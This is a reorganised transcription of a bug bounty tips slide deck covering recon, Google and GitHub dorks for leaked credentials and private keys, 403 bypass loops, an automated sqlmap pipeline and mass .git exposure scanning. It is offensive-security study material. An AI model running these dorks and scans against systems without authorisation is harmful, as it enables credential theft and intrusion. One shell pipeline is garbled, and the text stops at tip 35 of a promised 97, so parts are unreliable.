# 100+ Bug Bounty Tips

> A complete, searchable transcription of the **bounty_tips_100+** slide deck (116 slides), reorganised by topic. Offensive-security reference material — use it only against systems you are authorised to test.

**97 unique tips** across **15 categories** · 19 duplicate slides merged

---

## Contents

- **[Methodology & Mindset](#methodology--mindset)** — 9 tips
- **[Recon & OSINT](#recon--osint)** — 15 tips
- **[Subdomains & DNS](#subdomains--dns)** — 3 tips
- **[Scanning & Tooling](#scanning--tooling)** — 8 tips
- **[Authentication & Session](#authentication--session)** — 13 tips
- **[Authorization & IDOR](#authorization--idor)** — 6 tips
- **[Injection](#injection)** — 18 tips
- **[SSRF & Network](#ssrf--network)** — 4 tips
- **[File Upload & Traversal](#file-upload--traversal)** — 4 tips
- **[API & GraphQL](#api--graphql)** — 2 tips
- **[Cloud & Storage](#cloud--storage)** — 1 tip
- **[Client-Side](#client-side)** — 7 tips
- **[Business Logic](#business-logic)** — 3 tips
- **[Caching & Smuggling](#caching--smuggling)** — 2 tips
- **[Mobile](#mobile)** — 2 tips

## Methodology & Mindset

<details>
<summary>Show tips in this section</summary>

- [1. A Short P1 Story — Staging Admin Takeover](#1-a-short-p1-story--staging-admin-takeover)
- [2. From Subdomain Enum to RCE — Chain](#2-from-subdomain-enum-to-rce--chain)
- [3. `.new` — Quick Way to Open Anything on the Web](#3-new--quick-way-to-open-anything-on-the-web)
- [4. Web Vulnerability Checklist](#4-web-vulnerability-checklist)
- [5. Finding Bugs Without Recon Using Burp](#5-finding-bugs-without-recon-using-burp)
- [6. Bug Bounty Platforms](#6-bug-bounty-platforms)
- [7. Manual Testing Checklist (Recon and Low-Hanging Fruit)](#7-manual-testing-checklist-recon-and-low-hanging-fruit)
- [8. Primer on Character Encodings](#8-primer-on-character-encodings)
- [9. Web Application Testing Methodology](#9-web-application-testing-methodology)

</details>

### 1. A Short P1 Story — Staging Admin Takeover

**Tags:** #bugbounty #bugbountytip · **Slide:** 27/116

```
A short p1 story
1) ran subscan got staging.target.com:staging.target.com
2) it has signup n login page after signup got
   redirected target.com just a simple user account ..no
   email verification :xD
3) used hunter.io got email like maintainer@target.com
   Made account with this email on staging subdomain got
   access to admin dashboard with 13k+ users PII info
```

**Why it matters:** An unprotected staging host plus a trust assumption ("that email must be staff") produced a critical exposure.

---

### 2. From Subdomain Enum to RCE — Chain

**Slide:** 38/116

```text
Subdomain enumeration
-> Dirsearch on subdomains
-> Found hidden javascript file
-> Found external AWS host in the JS
-> Admin panel authentication at /admin bypass
-> SSRF
-> AWS key extract
-> Obfuscated content parsing
-> Set AWS credentials on my host
-> Downloaded files of the buckets
-> Found private API and secret keys
-> RCE
```

**Why it matters:** Each finding is low impact alone; chained, recon leads through SSRF and cloud credentials all the way to code execution.

---

### 3. `.new` — Quick Way to Open Anything on the Web

**Slide:** 53/116

Just type the following `.new` URL in your browser:

| URL | Action |
|-----|--------|
| `repo.new` | Create a new GitHub repository |
| `gist.new` | Create a new GitHub gist |
| `cal.new` | Create a new calendar event |
| `link.new` | Create a new Bitly link |
| `story.new` | Create a new GitHub story |
| `forms.new` | Create a new Google Form |
| `docs.new` | Create a new Google Doc |
| `sheets.new` | Create a new Google Sheet |
| `slides.new` | Create a new Google Sheet |
| `react.new` | Create a new React sandbox |
| `vue.new` | Create a new Vue sandbox |
| `ng.new` | Create a new Angular sandbox |

**Why it matters:** These shortcuts are handy during recon and reporting when you need a scratch doc or repo immediately.

---

### 4. Web Vulnerability Checklist

**Source:** © Harsha · **Slide:** 59/116

- CORS
- HTTP methods, Host header, JWT, tokens, cookies
- HTTP request smuggling
- Strict security
- Authentication
- Open redirect
- Open auth
- Injection (HTML, SQL, GraphQL, OS command, XXE, LFI, template, local file)
- Session management and broken auth
- DOM based
- XSS (stored, reflected, DOM, blind)
- WebSockets
- Web cache poisoning, disruption, deception
- Java deserialisation, insecure deserialisation
- No rate limit, CMS, out-of-band HTTPS, reset poisoning
- Password reset, weak password policy, password DoS
- Directory traversal, account takeover
- MFA bypass, WAF bypass, auth bypass, status code bypass
- Broken link hijacking, clickjacking
- Weak cryptography, application-level DoS
- SAML
- IDOR
- Buffer overflow
- CSRF
- SSRF
- Sensitive data exposure
- Information disclosure
- Code review
- CVE, RCE
- Privilege escalation
- Business logic
- GitHub recon

**Why it matters:** A breadth checklist to make sure no major bug class is skipped during an engagement.

---

### 5. Finding Bugs Without Recon Using Burp

**Slide:** 74/116

```
Finding bugs without recon using burp
```

1. CSRF
2. Account takeover via token leakage
3. Business logic bugs — payment option by response manipulation
4. OTP auth bypass

**Why it matters:** Proxy-driven testing on the flows you already have access to often beats broad recon for quick, high-impact findings.

---

### 6. Bug Bounty Platforms

**Slide:** 87/116

```text
Bug Bounty Platforms:

YesWeHack
Intigriti
HackerOne
Bugcrowd
Cobalt
Bountysource
Bounty Factory
Coder Bounty
FreedomSponsors
FOSS Factory
Synack
HackenProof
Detectify
Bugbounty.jp
Safehats
BugbountyHQ
Hackerhive
Hacktrophy
AntiHACK
CESPPA
```

**Why it matters:** Different platforms host different programs and payout models, so coverage matters as much as skill.

---

### 7. Manual Testing Checklist (Recon and Low-Hanging Fruit)

**Slide:** 92/116

- Directory listing vulnerabilities
- Exposed configuration files
- Exposed database files
- Find WordPress
- Exposed log files
- Backup and old files
- Login pages
- SQL errors
- Publicly exposed documents
- `phpinfo()`
- Finding backdoors
- Install / setup files
- Open redirects
- Apache STRUTS RCE
- Find Pastebin entries
- Employees on LinkedIn
- `.htaccess` sensitive files
- Find subdomains
- Find sub-subdomains
- Find WordPress #2
- Find WordPress [Wayback Machine]
- Search in GitHub
- Search in OpenBugBounty
- Search in Reddit
- Test cross-domain
- Check in ThreatCrowd
- Find `.SWF` file (Google)
- Find `.SWF` file (Yandex)
- Search SWF in Wayback Machine #1
- Search in Wayback Machine #2
- Search in Wayback Machine #3
- Search in Wayback Machine [List/All]
- Check in `crt.sh`
- Check in CENSYS [IP4] [DOMAINS] [CERTS]
- Search in Shodan

**Why it matters:** A repeatable pass over exposed files, old endpoints, and public archives catches most of the cheap findings before deeper testing.

---

### 8. Primer on Character Encodings

**Source:** @kamranahmedse · **Slide:** 109/116

Computers can only store 1s and 0s; everything else must be converted to 1s and 0s for the computer to work with.

**But how do we decide how to convert?**

Character encoding standards are used to do that. There are several, but let's focus on ASCII and Unicode (UTF-8, UTF-16, etc.) in this graphic.

**What are character encoding standards?** Standard mapping for character encoding, e.g. ASCII says `A` is 65 (`01000001`), `B` is 66 (`01000010`), and so on.

- A **charset** is, at its simplest, a lookup table used to encode some text.
- **Character encoding**: the character set (charset) is used to get the binary representation for the incoming text.

**Character encoding standards:**

- Morse Code, Baudot — just to show that ASCII wasn't the first encoding standard ever. No need to worry about these now.
- **ASCII** — took 8 bits to store; had 128 characters only; catered only for English; there was a disaster when computers started getting common.
- **Unicode** — no limit on characters; a single character set to include every writing system available. Just a standard; bits or storage is not relevant here.

**ASCII (American Standard Code for Information Interchange):** In ASCII we had numeric codes for alphabets, numbers, special characters, etc., e.g. 65 to 90 represented `A`–`Z`, 97 to 122 represented `a`–`z` and so on. There were only 128 characters in total and thus not really usable for non-English alphabets.

**Unicode:** Backwards compatible with ASCII. Unlike ASCII, there is no character-to-bits encoding — there is something called **codepoints**. A magic number assigned to every alphabet, written in the form of `U+0041` (represents `A` for example). Unicode doesn't tell how these characters are to be stored in memory. For storage we have UTF-8, UTF-16 and UTF-32.

**Why it matters:** Encodings explain why the same character has multiple byte representations — the root of overlong-encoding, UTF-7, and normalization bypasses.

---

### 9. Web Application Testing Methodology

**Slide:** 112/116

- **Recon and analysis**
  1. Map application content
  2. Analyze the application
- **Application logic**
  3. Test client-side controls
  9. Test for logic flaws
- **Access handling**
  4. Test authentication
  5. Test session management
  6. Test access controls
- **Input handling**
  7. Fuzz all parameters
  8. Test for issues with specific functionality
- **Application hosting**
  10. Test for shared hosting issues
  11. Test the web server
- **Cross-cutting**
  12. Miscellaneous checks
  13. Information leakage

**Why it matters:** It runs recon first, then branches into logic, access, input, and hosting so each area gets explicit coverage.

---

## Recon & OSINT

<details>
<summary>Show tips in this section</summary>

- [10. Google Dorks by Search Type](#10-google-dorks-by-search-type)
- [11. AlienVault OTX for Passive URL Discovery](#11-alienvault-otx-for-passive-url-discovery)
- [12. GitHub Dorking Tips](#12-github-dorking-tips)
- [13. 403 Find & Bypass](#13-403-find--bypass)
- [14. Broken Link Hijacking with SourceWolf](#14-broken-link-hijacking-with-sourcewolf)
- [15. Find Passwords and Exposed Files with Google Dorks](#15-find-passwords-and-exposed-files-with-google-dorks)
- [16. Hidden Parameter Trick](#16-hidden-parameter-trick)
- [17. GitHub Dorks](#17-github-dorks)
- [18. Recon Workflow (Mind Map)](#18-recon-workflow-mind-map)
- [19. Google Hacking Dorks (Spanish)](#19-google-hacking-dorks-spanish)
- [20. Top 5 Awesome Bug Bounty Google Dorks](#20-top-5-awesome-bug-bounty-google-dorks)
- [21. `asnrecon` — Dockerized ASN Recon](#21-asnrecon--dockerized-asn-recon)
- [22. Finding API Keys, Tokens and Passwords with GitHub Dorks](#22-finding-api-keys-tokens-and-passwords-with-github-dorks)
- [23. Google Docs as an Information Source](#23-google-docs-as-an-information-source)
- [24. GitHub Recon for Secret Keys](#24-github-recon-for-secret-keys)

</details>

### 10. Google Dorks by Search Type

**Slide:** 10/116

- **Cloud** — `site:`
- **Directory** — `allintext:`, `allintitle:`, `allinurl:`, `ext:`, `filetype:`, `intext:`, `intitle:`, `inurl:`
- **Groups** — `allintext:`, `allintitle:`, `author:`, `group:`, `insubject:`, `intext:`, `intitle:`
- **Image Search** — `allintitle:`, `allinurl:`, `filetype:`, `inurl:`, `intitle:`, `site:`
- **News** — `allintext:`, `allintitle:`, `allinurl:`, `intext:`, `intitle:`, `inurl:`, `location:`, `source:`
- **Product Search** — `allintext:`, `allintitle:`
- **Web Search** — `allinanchor:`, `allintext:`, `allintitle:`, `allinurl:`, `cache:`, `define:`, `filetype:`, `id:`, `inanchor:`, `info:`, `intext:`, `intitle:`

**Why it matters:** Each Google property supports a different subset of operators, so using `ext:` on web search or `cache:` on news simply yields nothing.

---

### 11. AlienVault OTX for Passive URL Discovery

**Slide:** 17/116

1. Go to `https://otx.alienvault.com/indicator/domain/<target domain>`
2. Replace `<target domain>` with your target.
3. Scroll down to the "Associated Urls" section.
4. Using AlienVault OTX you may find URLs that disclose sensitive information about other users (e.g. receipts), auth tokens, IDORs, interesting parameters/files, and many other gems.
5. Report & profit.

Note: API interface also available at:

```text
https://otx.alienvault.com/api/v1/indicators/domain/<target domain>/url_list?limit=50&page=1
```

**Why it matters:** Indexed historical URLs surface parameters and endpoints you would not find by browsing the live app.

---

### 12. GitHub Dorking Tips

**Source:** @HolyBugx · **Slide:** 24/116

```
Github Dorking Tips:

When doing github recon, Don't Just look on the repositories.

"Code" is the biggest one that mostly cause security vulnerabilities.

"Issues" is the second biggest, actually a gold mine.

"Commits" are good too, take your time on them too.
```

**Why it matters:** Secrets and internal hostnames live in code search, issue threads, and commit history — not just in the repo landing page.

---

### 13. 403 Find & Bypass

**Source:** @0xElkot · **Slide:** 25/116

In Kali, to find 403 pages:

```bash
python3 dirsearch.py -r -b -u <host> -i 403 -e php,html,json,aspx,sql,asp,js,txt
```

Put the result in a text file.

Install this tool in Kali — `https://github.com/smackerdodi/403bypasser.git` — then run:

```bash
for i in $(cat /path/to/403.txt); do python3 403bypasser.py https://<host>/ $i ; done
```

and wait for result `200, 302`.

By Burp: fuzz the result file in Burp and install this tool `https://github.com/sting8k/BurpSuite_403Bypasser` to bypass it.

Or make it manually with this write-up: `https://github.com/KathanP19/HowToHunt/tree/master/Status_Code_Bypass`

**Why it matters:** A 403 usually means "exists but forbidden" — header, path, and case tricks can turn it into a 200.

---

### 14. Broken Link Hijacking with SourceWolf

**Slide:** 29/116

Another tip for broken link hijacking:

1. Run SourceWolf against all your target subdomains.
2. Store all the responses in a directory.
3. Grab all the social media links from the response files, and probe them with SourceWolf to get the 404 social media pages. (This will be done using sourcewolf**)
4. Manually confirm whether those profiles actually don't exist.
5. If yes, check which page contains the broken link and take over the profile.

`**` Expect this to be integrated with SourceWolf within some time!

Existing users — look for an update right in the terminal!

**Why it matters:** A dead social-media link on a trusted brand page lets anyone register that handle and impersonate the company.

---

### 15. Find Passwords and Exposed Files with Google Dorks

**Source:** @null-byte · **Slide:** 33/116

```
Find Passwords, Informations, Exposed Log Files, Webcams and Email Lists with Google Dorks
```

Finding FTP servers & websites using HTTP:

```text
intitle:"index of" inurl:ftp after:2018
```

Find log files with passwords:

```text
allintext:password filetype:log after:2018
```

Find configuration files with passwords:

```text
filetype:env "DB_PASSWORD" after:2018
```

Find email lists:

```text
filetype:xls inurl:"email.xls"
```

Find open cameras:

```text
inurl:top.htm inurl:currenttime
```

**Why it matters:** `after:` keeps results recent, and `intitle:"index of"` finds directory listings that leak credentials and logs.

---

### 16. Hidden Parameter Trick

**Source:** @intigriti · **Slide:** 35/116

Scour JavaScript files for variable names, then try each of them as GET parameters to uncover hidden parameters. This often results in XSS!

```text
see: var test = "xxx"
try: https://example.com?test=xssest
---------------------------------------------
```

Made tool for find var name & append as a param:

```bash
assetfinder example.com |gau|egrep -v '(\.css|\.png|\.jpeg|\.jpg|\.svg|\.gif|\.woff)'|while read url; do
  vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9_]+" | sed -e 's/var //' | "$url"?=g' -e 's/ /%g' | grep -v '\.js' | sed 's/.*/=&/g');echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done
```

`@made by tarun.tmahour`

<!-- unclear: the shell pipeline above is partially garbled in the source; reproduce it as shown -->

**Why it matters:** Unused parameter names in front-end code often still reach a server-side handler that nobody documented.

---

### 17. GitHub Dorks

**Source:** "Mahendrda" · **Slide:** 43/116

```text
filename:sftp-config.json password
filename:.npmrc _auth
filename:.dockercfg auth
extension:pem private
filename:proftpdpasswd
filename:logins.json
filename:config.php dbpasswd
filename:dhcpd.conf
filename:sshd_config
filename:.bash_history
filename:.bashrc password
filename:id_rsa or filename:id_dsa
extension:sql mysql dump
extension:sql mysql dump password
filename:credentials aws_access_key_id
filename:.s3cfg
filename:.htpasswd
filename:.env DB_USERNAME NOT homestead
filename:.git-credentials
```

**Why it matters:** These filenames are the exact ones developers accidentally commit, and each often contains plaintext credentials or private keys.

---

### 18. Recon Workflow (Mind Map)

**Slide:** 46/116

- **Root Domains**
  - Reverse Whois — `whoxy.com`
  - ASN — `bgp.he.net`, `amass intel -asn 13452`
  - Acquisitions — `crunchbase.com`
  - → target
- **Subdomains**
  - **Subdomain Scraping** — `amass intel`, `amass enum`, Google, `subfinder`, `github-subdomains.py` (gwen), `shosubgo`, Shodan, scanning cloud ranges
  - **Subdomain Bruteforcing** — `amass enum -brute -d domain.com -src`, `amass enum -brute -d domain.com -w wordlist.txt -rf resolvers.txt`; tools: `amass`, `shuffledns`, `Jhaddix all.txt`, `common-speak`, wordlists
  - **Linkjs Discovery** — `gospider`, `hakrawler`, Burp Pro, LinkDiscoverer, `subdomainer`, `subscraper`, searching JS files
  - **Github Dorking** — `github-search` (by gwen)
  - **Port Scanning** — `masscan` (`masscan -p1-65535 -iL $ipFile --max-rate 1800 -eG $outputFile.txt`), `dnmmasscan` (`dnsmasscan domains.txt dns.log -p80,443 -oG output.txt`), `nmap`, `Brutespray`
  - **Screenshots** — HTTP screenshot, Aquatone, Eyewitness
  - **Takeovers** — Can I Takeover XYZ, `nuclei`, `subover`
  - **Tools** — `nuclei`, `subover`

**Why it matters:** Root-domain discovery feeds subdomain enumeration, which branches into scraping, brute force, port scanning, screenshots, and takeover checks.

---

### 19. Google Hacking Dorks (Spanish)

**Source:** @drok3r · **Slide:** 47/116

```
Google Hacking Dorks
```

Open directories (`index of` / directorios abiertos):

```text
intitle:"index of /" Parent Directory site:yoursitehere.com
```

Exposed admin directories (directorios de admin expuestos):

```text
intitle:"Index of /admin" site:yoursitehere.com
```

Exposed password directories (directorios de contraseña expuestos):

```text
intitle:"Index of /password" site:yoursitehere.com
```

**Why it matters:** The same three dorks work in any language — `intitle:"index of"` plus a directory keyword and `site:` scope.

---

### 20. Top 5 Awesome Bug Bounty Google Dorks

**Source:** @JacksonHHax · **Slide:** 50/116

```text
1. inurl:example.com intitle:"index of"
2. inurl:example.com intitle:"index of /" "*key.pem"
3. inurl:example.com ext:log
4. inurl:example.com intitle:index of ext:sql | xls | xml | json | csv
5. inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
```

**Why it matters:** Each dork targets a different leak class: directory listings, private keys, logs, database exports, and environment files.

---

### 21. `asnrecon` — Dockerized ASN Recon

**Slide:** 67/116

```text
root@ubuntu:/tmp# docker run -it asnrecon
Select an option:
    [1] Full ASN scan
    [2] Specific IPv4 range scan

1
Please input the host name: facebook.com
File "main.config" is missing, ips will not be ignored.
Found ranges : ['102.132.96.0/20', '103.4.96.0/22', '129.134.0.0/17', '129.134.25.0/24',
'129.134.26.0/24', '129.134.27.0/24', '129.134.28.0/24', '129.134.29.0/24', '129.134.30.0/23',
'129.134.30.0/24', '129.134.31.0/24', '157.240.0.0/17', '157.240.1.0/24', '157.240.11.0/24',
'157.240.12.0/24', '157.240.13.0/24'...]

Testing 102.132.96.0/20
[*] Domain found - https://102.132.96.2    -> facebook.com
[*] Domain found - https://102.132.96.11   -> facebook.com
[*] Domain found - https://102.132.96.15   -> fbinfra.net
[*] Domain found - https://102.132.96.16   -> facebook.com
[*] Domain found - https://102.132.96.8    -> atlassolutions.com
[*] Domain found - https://102.132.96.13   -> facebook.com
[*] Domain found - https://102.132.96.16   -> shortwave.facebook.com
[*] Domain found - https://102.132.96.27   -> facebook.com
[*] Domain found - https://102.132.96.28   -> fbinfra.net
[*] Domain found - https://102.132.96.33   -> facebook.com
```

**Why it matters:** Enumerating a target's ASN ranges and reverse-resolving every IP surfaces infrastructure that never appears in DNS-based recon.

---

### 22. Finding API Keys, Tokens and Passwords with GitHub Dorks

**Source:** @offensivekrish (hackergenix.com) · **Slide:** 73/116

```text
api_key
api keys
authorization_bearer:
oauth
auth
authentication
client_secret
api_token:
"api token"
client_id
password
user_password
user_pass
passcode
client_secret
secret
password hash
OTP
user auth
```

**Why it matters:** These literal strings appear next to hardcoded credentials in committed config and source files.

---

### 23. Google Docs as an Information Source

**Slide:** 78/116

```text
1) site:target.com filetype:pdf
2) Found a document which had a link to another document in Google Docs
3) Anyone can suggest and comment on Google Docs, as well as see the previous edits
```

**Why it matters:** Public Google Docs linked from a site expose revision history and comments that were never meant to be public.

---

### 24. GitHub Recon for Secret Keys

**Source:** @infosec_singh / @botnet.in · **Slide:** 84/116

```text
org : Target "bucket_name"
org : Target "aws_access_key"
org : Target "aws_secret_key"
org : Target "S3_BUCKET"
org : Target "S3_ACCESS_KEY_ID"
org : Target "S3_SECRET_ACCESS_KEY"
org : Target "S3_ENDPOINT"
org : Target "AWS_ACCESS_KEY_ID"
org : Target "list_aws_accounts"
```

**Why it matters:** Scoping the search to the target's GitHub org finds AWS keys in code even when the strings are not in a public repo's default branch.

---

## Subdomains & DNS

<details>
<summary>Show tips in this section</summary>

- [25. `chaos` + `httpx` Subdomain Enumeration](#25-chaos--httpx-subdomain-enumeration)
- [26. Subdomain Enumeration via the Spyse API](#26-subdomain-enumeration-via-the-spyse-api)
- [27. `recon()` — Subdomain and DNS Recon Function](#27-recon--subdomain-and-dns-recon-function)

</details>

### 25. `chaos` + `httpx` Subdomain Enumeration

**Slide:** 54/116

```bash
chaos -silent -d uber.com | ./httpx -ip -cname
```

```text
    __    __  __
   / /_  / /_/ /_____  _
  / __ \/ __/ __/ __ \/ /
 / / / / /_/ /_/ /_/ / /
/_/ /_/\__/\__/ .___(_/
             /_/
              v1.0.2

projectdiscovery.io

[WRN] Use with caution. You are responsible for your actions
[WRN] Developers assume no liability and are not responsible for any misuse or damage.

https://accessibility.uber.com [34.98.127.226] [frontends-all.uber.com]
https://accounts.uber.com [104.36.195.150] [frontends-all.uber.com]
https://api.uber.com [104.36.195.151] [frontends.uber.com]
https://assets-share.uber.com [13.35.13.16] [dgjfjug4gwr33.cloudfront.net]
https://auth.uber.com [34.98.127.226] [frontends-all.uber.com]
https://azkaban.uber.com [104.36.195.150] [frontends-primary.uber.com]
... (output truncated)
https://cn-dcai.uber.com [35.201.81.34] [cn.cfe.uber.com]
https://cn-phx2.cfe.uber.com [35.201.81.34] [cn.cfe.uber.com]
https://cn-dcai.uber.com [104.36.195.150]
```

**Why it matters:** Piping a subdomain feed into `httpx` resolves each host and exposes CNAMEs, which point at the cloud provider or third-party service behind it.

---

### 26. Subdomain Enumeration via the Spyse API

**Slide:** 69/116

```bash
ifrah@iman:~$ curl -X GET "https://api.spyse.com/v3/data/domain/subdomain?limit=100&offset=100&domain=yahoo.com" -H "accept: application/json" -H "Authorization: Bearer tokenhere" 2>/dev/null | jq '.data.items | .[] | .name' | sed -e 's/"/ /g' -e 's/$//' | grep yahoo.com
```

```text
f1375.mail.vip.in.yahoo.com
sync200189-1.mail.ne1.yahoo.com
ha1.g1-0-2.bas2-yst.gq1.yahoo.com
lo0.egr1-1-coa.corp.gq1.yahoo.com
tor169-219-pdb.bf1.yahoo.com
node54.kube4.corp.gq1.yahoo.com
budup1.cd.nads.tp2.yahoo.com
et4-1.egr3-3-grc.gq1.yahoo.com
et49.rsw7-1-edg.sj2.yahoo.com
sync200083-3.mail.ne1.yahoo.com
gq1-midaschdb-002-v.data.corp.gq1.yahoo.com
iis22.mobile.bf1.yahoo.com
sync700132-3.mail.ir2.yahoo.com
proxy1.ops.bfv.yahoo.com
et50.rsw4-2-edg.twc.yahoo.com
stage.hk.hp.vip.kr3.yahoo.com
ipv4-reserved-016.ostk.bm2.prod.ne1.yahoo.com
sync400172-2.mail.bf2.yahoo.com
```

**Why it matters:** Third-party DNS datasets return internal-looking hostnames (mail, kube, corp) that ordinary brute force rarely finds.

---

### 27. `recon()` — Subdomain and DNS Recon Function

**Slide:** 89/116

```bash
recon(){
    assetfinder --subs-only $1 | tee asset_$2
    python ~/Sublist3r/sublist3r.py -d $1 -o sub_$2
    cat asset_$2 sub_$2 > all_$2
    sort -u all_$2 | tee domain_$2
    dig txt -f domain_$2 | tee dns_$2
}
```

**Why it matters:** One function combines passive sources, deduplicates the results, and resolves TXT records for the whole list.

---

## Scanning & Tooling

<details>
<summary>Show tips in this section</summary>

- [28. Nuclei — Running Targeted Scans with Templates](#28-nuclei--running-targeted-scans-with-templates)
- [29. Nuclei — Installation](#29-nuclei--installation)
- [30. `ffufr()` — ffuf Wrapper Function](#30-ffufr--ffuf-wrapper-function)
- [31. KingOfBugBountyTip — One-Liner SQLi Pipeline](#31-kingofbugbountytip--one-liner-sqli-pipeline)
- [32. Bulk Host Scanning with `bounty-targets-data`](#32-bulk-host-scanning-with-bounty-targets-data)
- [33. Recommended Burp Suite Extensions](#33-recommended-burp-suite-extensions)
- [34. Useful Burp Suite Extensions (with Links)](#34-useful-burp-suite-extensions-with-links)
- [35. Patrik's Bug Bounty Tools (Mind Map)](#35-patriks-bug-bounty-tools-mind-map)

</details>

### 28. Nuclei — Running Targeted Scans with Templates

**Source:** @x_bug_community · **Tags:** #cryptocyber · **Slide:** 5/116

```
Nuclei -- Tool For Targeted Scanning Based On Templates
Running nuclei
```

1. Running nuclei with a single template:

```bash
nuclei -l urls.txt -t git-core.yaml -o results.txt
```

or:

```bash
cat urls.txt | nuclei -t git-core.yaml -o results.txt
```

2. Running nuclei with multiple templates:

```bash
nuclei -l urls.txt -t "path-to-templates/*.yaml" -o results.txt
```

3. Automating nuclei with subfinder and any other similar tool:

```bash
subfinder -d domain.com | httprobe | nuclei -t "path-to-templates/*.yaml" -o results.txt
```

Note: Nuclei supports glob expressions ending in `.yaml`, meaning multiple templates can be easily passed to be executed one after the other.

**Why it matters:** Piping recon output straight into nuclei turns a list of hosts into template-based findings in one command.

---

### 29. Nuclei — Installation

**Source:** @x_bug_community · **Tags:** #cryptocyber · **Slide:** 6/116

```
Nuclei -- Tool For Targeted Scanning Based On Templates
Installation -
```

From binary:

```bash
> tar -xzvf nuclei-linux-amd64.tar
> mv nuclei-linux-amd64 /usr/bin/nuclei
> nuclei -h
```

From source:

```bash
> GO111MODULE=on go get -u -v github.com/projectdiscovery/nuclei/cmd/nuclei
```

<!-- continues -->

**Why it matters:** A correct install with `nuclei -h` verified is the prerequisite for the template-based scanning workflow on the previous slide.

---

### 30. `ffufr()` — ffuf Wrapper Function

**Slide:** 51/116

```bash
ffufr()
{
ffuf -c -w /SecLists/Discovery/Web-Content/$1 -u http://$2/FUZZ -recursion
}

usage: "ffufr common.txt tesla.com"
```

1. Download SecLists wordlists — `https://github.com/danielmiessler/SecLists`
2. Install ffuf — `https://github.com/ffuf/ffuf`
3. Go to home directory (`cd`)
4. `nano/vim .bashrc`
5. Configure the function above to your SecLists Web-Content path.
6. Save the `.bashrc`
7. Run `source .bashrc` to update the changes made.
8. Run `ffufr WORDLISTNAME.txt DOMAIN.com`

**Why it matters:** A shell function turns recursive content discovery into a one-liner with a chosen wordlist.

---

### 31. KingOfBugBountyTip — One-Liner SQLi Pipeline

**Source:** @FJAAAH, @zeroc00I, @KingOfBugbounty · **Slide:** 60/116

```bash
findomain -t testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1
```

- Search to target subdomains
- `httpx` is a fast and multi-purpose HTTP toolkit
- `anew` removes duplicates
- `gf sqli` analyzes URLs for SQL parameters
- `sqlmap` imports the file to search for SQL injection

**Why it matters:** Chaining passive URL sources with `gf` narrows thousands of historical URLs down to the ones that actually carry SQL parameters.

---

### 32. Bulk Host Scanning with `bounty-targets-data`

**Source:** @FJAAAH, @zeroc00I, @KingOfBugbounty · **Slide:** 61/116

```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | sed 's#$#/.git/HEAD#' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```

- Download the `bounty-targets-data` repository list
- Read the `domains.txt` file
- We inject using `sed` the `.git/HEAD` command at the end of each URL
- Seeking status `301,302`, on doors `80,8080,443`
- We use `anew` to not duplicate URLs (`sort -u`)

**Why it matters:** Requesting `/.git/HEAD` across every bug-bounty domain is a fast way to find exposed Git repositories.

---

### 33. Recommended Burp Suite Extensions

**Slide:** 81/116

1. JSON Beautifier
2. Param Miner
3. HTTP Request Smuggler
4. Backslash Powered Scanner
5. Reflected Parameters
6. Software Vulnerability Scanner
7. Java Deserialization Scanner
8. .Net Beautifier
9. Copy As Python-Request
10. Collaborator Everywhere
11. Custom Parameter Handler
12. AuthMatrix
13. GraphQL Raider
14. Piper
15. JSON Web Token Attacker
16. InQL - Introspection GraphQL Scanner

**Why it matters:** These cover hidden parameters, smuggling, deserialization, JWT, and GraphQL — the gaps a default scanner proxy leaves.

---

### 34. Useful Burp Suite Extensions (with Links)

**Slide:** 93/116

```text
Active Scan++            : https://github.com/portswigger/active-scan-plus-plus
HTTP Request Smuggler    : https://github.com/portswigger/http-request-smuggler
JSON Beautifier          : https://github.com/portswigger/json-beautifier
Sitemap Extractor        : https://github.com/PortSwigger/site-map-extractor
Param-Miner              : https://github.com/PortSwigger/param-miner
JSON Web Tokens          : https://github.com/portswigger/json-web-tokens
Autorize                 : https://github.com/PortSwigger/autorize
Retire-JS                : https://github.com/portswigger/retire-js
Param Miner              : https://github.com/portswigger/param-miner
BurpJSLnkFinder          : https://github.com/IntlRoot/BurpJSLnkFinder
BurpBounty               : https://github.com/wagiro/BurpBounty
domain_hunter            : https://github.com/bit4woo/domain_hunter
Turbo Intruder           : https://github.com/portswigger/turbo-intruder
```

**Why it matters:** Direct links save time and avoid installing look-alike extensions from unofficial sources.

---

### 35. Patrik's Bug Bounty Tools (Mind Map)

**Source:** @itsecurityguard · **Slide:** 98/116

- **Information Gathering**
  - Subdomain enumeration — Amass, Subfinder, Assetfinder, Findomain, Sublist3r
  - Subdomain bruteforcing — `puredns`, `shuffledns`, `massdns`, `dnsx`
  - Historical data — `waybackurls`, `gau`, `waybackpack`, `commoncrawl`
  - IP range — `whois`, `asnmap`, `bgp.he.net`, `whoisxmlapi`
  - Virtual host discovery — `ffuf`, `gobuster`, `vhost`
  - Reverse whois — `whoxy`, `viewdns`, `whoisxmlapi`
  - Internet scanning — `shodan`, `censys`, `zoomeye`, `fofa`
  - Ports/services — `naabu`, `nmap`, `masscan`
  - Passive DNS monitoring — `securitytrails`, `dnsdumpster`
  - JavaScript — `getJS`, `linkfinder`, `subjs`, `JSFinder`
  - Content discovery — `ffuf`, `dirsearch`, `gobuster`, `feroxbuster`
  - DNS permutation — `dnsgen`, `altdns`, `shuffledns`
  - DNS resolvers — `dnsvalidator`, `massdns`, `puredns`
  - Spider — `gospider`, `hakrawler`, `katana`
  - Screenshotting tools — `aquatone`, `eyewitness`, `gowitness`
  - HTTP/HTTPS probe — `httpx`, `httprobe`
  - Certificate transparency — `crt.sh`, `certspotter`, `amass`
- **Web Application Scanning**
  - **Web application scanners** — Burp Suite Professional, Acunetix, Netsparker, AppScan, Nikto, Wapiti, Arachni, ZAP
  - **OS-command injection** — `commix`
  - **Blind cross-site scripting** — `XSStrike`, `XSSer`, `dalfox`
  - **SQL injection** — `sqlmap`
  - **Default password scanner** — `hydra`, `medusa`, `patator`, `ncrack`
  - **S3 bucket bruteforcing** — `S3Scanner`, `AWSBucketDump`
  - **GitHub secrets** — `gitleaks`, `trufflehog`, `gitrob`
  - **CMS scanner** — `wpscan`, `joomscan`, `droopescan`
  - **Reflected cross-site scripting** — `XSStrike`, `XSSer`, `dalfox`
